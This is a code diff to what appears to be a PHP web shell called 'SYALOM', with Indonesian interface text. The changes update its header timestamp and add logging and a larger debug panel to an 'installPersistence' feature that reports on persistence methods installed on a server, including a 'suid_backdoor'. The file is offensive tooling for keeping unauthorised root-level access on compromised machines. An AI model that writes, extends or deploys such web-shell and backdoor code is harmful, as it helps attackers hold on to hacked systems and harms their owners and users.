@@ -3523,7 +3523,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 290326 1843</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 290326 1924</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -7172,6 +7172,9 @@ function installPersistence() {
     fetch('', { method: 'POST', body: formData })
         .then(response => response.json())
         .then(data => {
+            console.log('Persistence data received:', data);
+            console.log('Methods:', data.methods);
+            console.log('SUID backdoor:', data.methods?.suid_backdoor);
             if (data.success) {
                 let html = '<div style="background:#001a00;border:1px solid #0f0;padding:15px;margin-bottom:15px;">';
                 html += '<h3 style="color:#0f0;margin:0 0 10px 0;">✅ PERSISTENCE BERHASIL DIINSTALL!</h3>';
@@ -7266,10 +7269,16 @@ function installPersistence() {
                     }
                     
                     // Show debug log for suid_backdoor if available
-                    if (method === 'suid_backdoor' && info.debug_log) {
-                        html += '<div style="margin-top:10px;">';
-                        html += '<p style="color:#6cf;margin:5px 0;font-size:11px;">🔍 <strong>Debug Log:</strong></p>';
-                        html += '<textarea readonly style="width:100%;height:200px;background:#000;color:#888;border:1px solid #333;padding:8px;font-family:monospace;font-size:10px;resize:vertical;overflow:auto;">' + escapeHtml(info.debug_log) + '</textarea>';
+                    console.log('Checking debug_log for method:', method, 'has debug_log:', !!info.debug_log);
+                    if (method === 'suid_backdoor') {
+                        html += '<div style="margin-top:15px;border:3px solid #ff0;padding:15px;background:#1a1a00;">';
+                        html += '<p style="color:#ff0;margin:0 0 10px 0;font-size:14px;font-weight:bold;">🔍 DEBUG LOG (SUID BACKDOOR)</p>';
+                        if (info.debug_log) {
+                            html += '<textarea readonly style="width:100%;height:300px;background:#000;color:#0f0;border:2px solid #0f0;padding:10px;font-family:monospace;font-size:11px;resize:vertical;overflow:auto;">' + escapeHtml(info.debug_log) + '</textarea>';
+                        } else {
+                            html += '<p style="color:#f80;margin:5px 0;font-size:12px;">⚠️ No debug log available</p>';
+                            html += '<textarea readonly style="width:100%;height:100px;background:#000;color:#888;border:1px solid #333;padding:8px;font-family:monospace;font-size:10px;">Debug log not generated. Check console for data structure.</textarea>';
+                        }
                         html += '</div>';
                     }
                     
